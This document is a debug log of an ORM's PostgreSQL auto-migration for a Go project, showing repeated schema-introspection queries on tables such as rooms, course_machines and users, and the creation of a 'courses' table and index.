[0m[33m[0.517ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.114ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.104ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.085ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.061ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.776ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.066ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.325ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.881ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.086ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.027ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.843ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.686ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.393ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.470ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.599ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.391ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.733ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.733ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.213ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.186ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.174ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.081ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.094ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.898ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.861ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.378ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.725ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.657ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.009ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.640ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.485ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.046ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.072ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.340ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.221ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.064ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.067ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.287ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.065ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.859ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.804ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.589ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[22.073ms] [34;1m[rows:0][0m CREATE TABLE "courses" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"content" text NOT NULL,"room_id" bigint,"course_machine_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_courses_course_machine" FOREIGN KEY ("course_machine_id") REFERENCES "course_machines"("id"),CONSTRAINT "fk_courses_room" FOREIGN KEY ("room_id") REFERENCES "rooms"("id"))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.873ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_courses_deleted_at" ON "courses" ("deleted_at")

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.645ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.338ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.150ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.511ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.886ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[21.318ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.579ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.058ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.536ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.038ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.030ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.082ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.068ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
